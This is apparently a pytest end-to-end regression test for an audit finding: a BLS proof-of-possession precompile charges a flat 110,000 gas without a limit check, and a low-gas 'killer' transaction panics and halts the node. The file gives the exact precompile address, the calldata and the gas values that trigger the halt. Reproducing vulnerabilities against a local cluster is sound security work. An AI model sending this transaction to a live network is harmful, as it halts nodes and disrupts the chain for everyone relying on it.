"""
E2E reproduction of issue #678 (CRITICAL): BLS PoP precompile DoS / node halt.

The BLS proof-of-possession precompile at
    0x00000000000000000000000000000001625f5001
returns a flat gas_used = 110_000 with NO gas-limit check. When a normal
transaction from any funded account calls it while forwarding fewer than
110_000 gas to the precompile frame, the execution layer hits an
unconditional `assert!(record_cost(...))` in alloy-evm and panics the node
deterministically (log line: "Gas underflow is not possible").

This is an AUTHORIZED security-audit reproduction. It runs ONLY against a
local throwaway single-validator cluster (never the public testnet).

Confirmed on testnet:
  - A WELL-gassed call (gas=300000) succeeds with gasUsed == 131576
    (= 21000 intrinsic + 576 for 144 zero-byte calldata + 110000 precompile).
  - A low-gas call (gas ~30000, i.e. < 110000 forwarded) halts the node.

Test flow:
  1. Bring the single node fully live and assert it is producing blocks.
  2. (Control) Send a WELL-gassed call (gas=300000) and assert it mines with
     gasUsed == 131576 — proving the precompile is reached and charges 110k.
  3. (Killer) Send a low-gas call (gas=30000) with 144 zero calldata bytes.
  4. Assert the node HALTS: poll block height for ~30s and assert it stops
     advancing (and/or the process exits); grep the node log for the panic.
"""

import asyncio
import logging
import time
from pathlib import Path

import pytest
from web3 import Web3

from gravity_e2e.cluster.manager import Cluster
from gravity_e2e.utils.transaction_builder import TransactionBuilder, TransactionOptions

LOG = logging.getLogger(__name__)

# The vulnerable BLS proof-of-possession precompile address (issue #678).
BLS_POP_PRECOMPILE = Web3.to_checksum_address(
    "0x00000000000000000000000000000001625f5001"
)

# 144 zero bytes of calldata (the input the precompile is invoked with).
CALLDATA_144_ZEROS = "0x" + ("00" * 144)

# Expected gas for a WELL-gassed call: 21000 intrinsic + 576 (144 zero
# calldata bytes * 4) + 110000 flat precompile charge.
EXPECTED_WELL_GASSED_GAS_USED = 131576

# Gas limit for the killer tx. < 110000 must be forwarded to the precompile
# frame after the 21000 intrinsic + 576 calldata cost is deducted.
KILLER_GAS_LIMIT = 30000

# Gas limit for the well-gassed control call.
CONTROL_GAS_LIMIT = 300000

PANIC_MARKER = "Gas underflow is not possible"


def _node_log_paths(cluster: Cluster) -> list[Path]:
    """All node log files that might contain the execution-layer panic."""
    base = Path(cluster.config["cluster"]["base_dir"])
    node_dir = base / "node1"
    candidates = [
        node_dir / "logs" / "debug.log",
        node_dir / "logs" / "execution_logs",
        node_dir / "logs",
    ]
    paths: list[Path] = []
    for c in candidates:
        if c.is_dir():
            paths.extend(p for p in c.rglob("*") if p.is_file())
        elif c.is_file():
            paths.append(c)
    return paths


def _grep_panic(cluster: Cluster) -> str | None:
    """Return the first log line containing the panic marker, if any."""
    for p in _node_log_paths(cluster):
        try:
            with open(p, "r", errors="ignore") as f:
                for line in f:
                    if PANIC_MARKER in line:
                        return f"{p}: {line.strip()}"
        except OSError:
            continue
    return None


@pytest.mark.xfail(
    reason=(
        "gravity-audit #678: the BLS PoP precompile (0x..1625f5001) returns a flat "
        "gas_used=110_000 with no gas-limit check, so a sub-cost-gas call panics the "
        "node ('Gas underflow is not possible') instead of an out-of-gas revert. "
        "Remove this xfail when the precompile gas-limit guard lands."
    ),
    strict=False,
)
@pytest.mark.asyncio
async def test_bls_precompile_halt(cluster: Cluster):
    # ---- 1. Node live and producing blocks --------------------------------
    assert await cluster.set_full_live(timeout=60), "Cluster failed to become live"
    node = cluster.get_node("node1")
    assert node, "node1 not found in cluster config"

    assert await cluster.check_block_increasing(timeout=30), (
        "Node is not producing blocks before the test"
    )
    h0 = node.get_block_number()
    LOG.info(f"Node is live and advancing. Height before attack: {h0}")

    sender = cluster.faucet
    assert sender, "Faucet account not configured"
    LOG.info(f"Faucet/sender address: {sender.address}")

    tb = TransactionBuilder(node.w3, sender)

    # ---- 2. Control: WELL-gassed call should reach the precompile ----------
    LOG.info(
        f"Sending WELL-gassed control call to {BLS_POP_PRECOMPILE} "
        f"(gas={CONTROL_GAS_LIMIT})..."
    )
    control = await tb.build_and_send_tx(
        to=BLS_POP_PRECOMPILE,
        data=CALLDATA_144_ZEROS,
        options=TransactionOptions(gas_limit=CONTROL_GAS_LIMIT, value=0),
        wait_for_receipt=True,
    )
    assert control.success, f"Control call did not succeed: {control.error}"
    LOG.info(
        f"Control call mined in block {control.block_number}, "
        f"gasUsed={control.gas_used}"
    )
    assert control.gas_used == EXPECTED_WELL_GASSED_GAS_USED, (
        f"Precompile not reached as expected: gasUsed={control.gas_used}, "
        f"expected {EXPECTED_WELL_GASSED_GAS_USED}"
    )

    # Sanity: node still advancing after the control call.
    assert await node.wait_for_block_increase(timeout=20), (
        "Node stopped advancing after the (benign) control call"
    )
    h_pre = node.get_block_number()
    LOG.info(f"Height after control call (before killer): {h_pre}")

    # ---- 3. Killer: low-gas call forwards < 110k to the precompile ---------
    LOG.info(
        f"Sending LOW-GAS killer call to {BLS_POP_PRECOMPILE} "
        f"(gas={KILLER_GAS_LIMIT}) — expecting node halt..."
    )
    # Do NOT wait for a receipt: the node is expected to panic while executing
    # this tx, so no receipt will ever come back.
    killer_tx = await tb.build_transaction(
        to=BLS_POP_PRECOMPILE,
        data=CALLDATA_144_ZEROS,
        options=TransactionOptions(gas_limit=KILLER_GAS_LIMIT, value=0),
    )
    try:
        killer = await tb.send_transaction(killer_tx, wait_for_receipt=False)
        LOG.info(f"Killer tx submitted: {killer.tx_hash}")
    except Exception as e:
        # Submission itself may race the node's death; that's still consistent
        # with the halt and we proceed to verify the freeze below.
        LOG.warning(f"Killer tx submission raised (node may already be dying): {e}")

    # ---- 4. Assert the node HALTS -----------------------------------------
    # Poll height for ~30s. A healthy node would add many blocks; a halted one
    # freezes (RPC stops responding or height stops advancing).
    LOG.info("Polling block height for ~30s to detect halt...")
    h_attack = h_pre
    try:
        h_attack = node.get_block_number()
    except Exception as e:
        LOG.info(f"RPC already unreachable right after killer tx: {e}")

    heights: list[int] = []
    rpc_failures = 0
    deadline = time.time() + 30
    while time.time() < deadline:
        try:
            heights.append(node.get_block_number())
        except Exception:
            rpc_failures += 1
        await asyncio.sleep(2)

    last_height = heights[-1] if heights else h_attack
    max_height = max(heights) if heights else h_attack
    LOG.info(
        f"After killer: start≈{h_attack}, samples={heights}, "
        f"max={max_height}, rpc_failures={rpc_failures}"
    )

    # The process may also have exited outright.
    process_alive = node.is_running()
    LOG.info(f"Node process alive after killer: {process_alive}")

    panic_line = _grep_panic(cluster)
    if panic_line:
        LOG.info(f"Found panic marker in node log -> {panic_line}")

    # CORRECT (post-fix) behavior: a low-gas precompile call must be an ordinary
    # out-of-gas revert. The node must stay alive, keep producing blocks, the RPC
    # must remain responsive, and there must be NO panic in the log.
    # Today the precompile lacks a gas-limit check (gravity-audit #678), so the
    # node panics instead — this assertion fails and the test is reported xfail
    # until the fix lands. Remove the @pytest.mark.xfail when it starts passing.
    advanced = max_height - h_attack
    node_healthy = (
        process_alive
        and rpc_failures == 0
        and advanced >= 1
        and panic_line is None
    )

    assert node_healthy, (
        "Node did not survive a low-gas BLS PoP precompile call (gravity-audit #678): "
        f"process_alive={process_alive}, rpc_failures={rpc_failures}, "
        f"height_advanced={advanced} (from {h_attack} to {max_height}), "
        f"panic_line={panic_line}"
    )

    LOG.info("Node remained healthy after the low-gas precompile call (#678 fixed).")
